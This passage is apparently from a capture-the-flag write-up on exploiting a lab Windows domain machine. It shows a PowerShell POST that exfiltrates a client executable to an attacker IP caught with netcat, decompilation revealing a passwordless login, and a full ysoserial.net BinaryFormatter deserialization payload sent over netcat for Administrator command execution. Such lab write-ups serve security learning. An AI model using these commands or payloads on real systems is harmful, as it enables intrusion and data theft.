</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; cd ScrambleCorp
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\S</span>crambleCorp&gt; dir : Access to the path <span style="color:#e6db74">&#39;C:\Program Files\ScrambleCorp&#39;</span> is denied.</span></span></code></pre></div></p>
<p>So it looks like I cannot see the server&rsquo;s directory, thus I can&rsquo;t reverse engineer this server, and since <em>Miscsvc</em> is the only user, I can guess that the <em>Administrator</em> is the one responsible of it, which might be my way to escalate. I then found the <em>client executable</em> in one of the shares that <em>Miscsvc</em> had read permission to.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">86528</span> ScrambleClient.exe                                                    
</span></span><span style="display:flex;"><span>-a----       05/11/2021     20:52          <span style="color:#ae81ff">19456</span> ScrambleLib.dll                                                       </span></span></code></pre></div></p>
<p>So I&rsquo;ll copy these two files to my kali machine. I&rsquo;ll use powershell <em>Invoke-RestMethod</em> which will allow me to send <em>Post</em> requests including the file as parameter, then will catch this request from my kali machine using <em>netcat</em>.
However, I need to copy these files to a directory that I own to avoid access denied error.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ScrambleClient.exe C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cp ScrambleLib.dll C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\S</span>hares<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\A</span>pps<span style="color:#ae81ff">\S</span>ales Order Client&gt; cd C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\d</span>ocuments&gt; Invoke-RestMethod -Uri <span style="color:#e6db74">&#34;http://10.10.16.59:9001/&#34;</span> -Method Post -UseDefaultCredentials -Infile <span style="color:#e6db74">&#34;ScrambleClient.exe&#34;</span></span></span></code></pre></div>
On kali I&rsquo;ll catch this using:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">9001</span> | awk <span style="color:#e6db74">&#39;NR &gt; 7 { print }&#39;</span> &gt; ScrambleClient.exe</span></span></code></pre></div></p>
<ul>
<li>I used awk here to strip the first few lines of <em>HTTP Request</em> that include <em>Request Line</em> and <em>Request Headers</em> because I only need the content of the files.</li>
<li>Also, I need to press <em>ENTER</em> key in my netcat listener in order to terminate the connection from <em>Invoke-RestMethod</em>.</li>
</ul>
<h2 id="exploring-scrambleclient-executable">Exploring ScrambleClient executable</h2>
<p>From this point, I&rsquo;ll spawn 

<a href="https://github.com/mandiant/commando-vm" target="_blank"><em>Commando VM</em></a> (windows vm for penetration testing) in order to better debug the application using 

<a href="https://github.com/dnSpy/dnSpy" target="_blank"><em>dnspy</em></a>.</p>
<p><img src="application-image.png" alt="Application Image"></p>
<p>Looks like this application requires some credentials (the old ones did not work).</p>
<p>While inspecting it using 

<a href="https://github.com/dnSpy/dnSpy" target="_blank"><em>dnspy</em></a>, I found an interesting <em>login</em> check function:</p>
<p><img src="dnspy-finding-login-function.png" alt="Dnspy Finding Login Function"></p>
<p>Double clicking this function will show me how it handles the checking:</p>
<p><img src="bypassing-login-custom-application.png" alt="Bypassing Login in Custom Application"></p>
<p>It appears that anyone with the name <em>scrmdev</em> can login to the application without even supplying a password!</p>
<p><img src="orders-custom-app.png" alt="Orders Custom App"></p>
<h3 id="finding-potential-desirialization-vulnerability">Finding Potential Desirialization Vulnerability</h3>
<p>Scrolling down a little bit in 

<a href="https://github.com/dnSpy/dnSpy" target="_blank"><em>dnspy</em></a>, I came accross an upload function that uploads some data to the server, but what&rsquo;s interesting about it is that it uses serialization:</p>
<p><img src="upload-function-using-serialization.png" alt="Finding Interesting Uploads Function"></p>
<p>Digging deeper, I found that it uses 

<a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities" target="_blank"><em>BinaryFormatter</em></a> object which is vulnerable to 

<a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities" target="_blank"><em>Desirialization Attack</em></a>:</p>
<p><img src="use-of-binaryformatter.png" alt="Finding the use of BinaryFormatter"></p>
<p>Since this is the client application, I can assume that the server also desirialzes this object using 

<a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities" target="_blank"><em>BinaryFormatter</em></a>, thus is prone to 

<a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities" target="_blank"><em>Desirialization Attack</em></a>.</p>
<h3 id="exploiting-desirialization-vulnerability">Exploiting Desirialization Vulnerability</h3>
<p>I found these blogs to be useful to understand how to exploit this vulnerabilty:</p>
<ul>
<li>

<a href="https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7" target="_blank">https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7</a></li>
<li>

<a href="https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/" target="_blank">https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/</a></li>
</ul>
<p>I&rsquo;ll use 

<a href="https://github.com/pwntester/ysoserial.net" target="_blank"><em>ysoserial.net</em></a> to generate the payload:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c <span style="color:#e6db74">&#39;cmd.exe /C type C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Miscsvc\PWNED.txt&#39;</span> -o base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div></p>
<p>Now let&rsquo;s try to send this encoded payload to see if I get anything back.</p>
<h3 id="understanding-how-to-send-data">Understanding How to send Data</h3>
<p>I&rsquo;ll use <em>netcat</em> to connect to the server, however I need to know how to send data for the server to accept it.</p>
<p>Again using 

<a href="https://github.com/dnSpy/dnSpy" target="_blank"><em>dnspy</em></a>:</p>
<p><img src="finding-request-function.png" alt="Finding Request Method"></p>
<p>This function appears to be taking two parameters, <em>RequestType.UploadOrder</em> and the <em>Base64 Encoded Data</em>.
Digging deeper:</p>
<p><img src="finding-value-of-parameters.png" alt="Finding Value of Parameters"></p>
<p><img src="understanding-the-request-method.png" alt="Understanding the request method"></p>
<p>I can see that the request is done under this form: <em>UPLOAD_ORDER;[Base64 Encoded Data]</em></p>
<h3 id="getting-command-execution-as-administrator">Getting Command Execution As Administrator</h3>
<p>Now I can connect using netcat and test if the payload will work:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc scrm.local <span style="color:#ae81ff">4411</span>
</span></span><span style="display:flex;"><span>SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div>
From my previous shell:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc&gt; cat PWNED.txt
</span></span><span style="display:flex;"><span>296**************************30a</span></span></code></pre></div></p>
<p>I can now execute commands as <em>Administrator</em>.</p>
<ul>
<li>If you&rsquo;re following along, you might have noticed that I can get Administrator directly, and avoid the use of <em>xp_cmdshell</em>, by simply requesting a <em>TGT</em> for user <em>Miscsvc</em> after getting his credentials, and then use the ticket with 

<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py" target="_blank"><em>impacket-smbclient.py</em></a> (-k option like before) to read the shares and get <em>ScrambledClient.exe</em> then exploit the server.</li>
</ul>
]]></content>
        </item>
        
    </channel>
</rss>
